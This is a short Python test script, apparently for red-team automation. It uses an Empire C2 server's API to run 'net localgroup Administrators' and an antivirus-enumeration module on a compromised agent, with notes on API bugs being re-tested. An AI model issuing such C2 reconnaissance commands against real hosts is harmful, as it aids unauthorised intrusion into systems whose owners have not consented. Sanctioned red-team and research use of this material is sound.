"""
Changes in REST API results broke agent_get_results
Need to re-test
Test observations:
- return results not have AgentsResult
- need clear agent result buffer before issue commands/modules that we want to get results
- DO NOT run get result via API while interacting with agent in Empire console. It will interfere with API get task result.
"""
from EmpireAPIWrapper import empireAPI
from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
from autocomplete.empire import situational_awareness

API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
agent_name = API.agents()['agents'][0]['name']
opts = {'Agent': agent_name, 'command': 'net localgroup Administrators'}
r = API.agent_run_shell_cmd_with_result(agent_name, opts)
print(type(r))
print(r)
opts = situational_awareness.host_antivirusproduct.options
r = API.module_exec_with_result(situational_awareness.host_antivirusproduct.path, 
            {opts.required_agent: agent_name}, agent_name)
print(type(r))
print(r)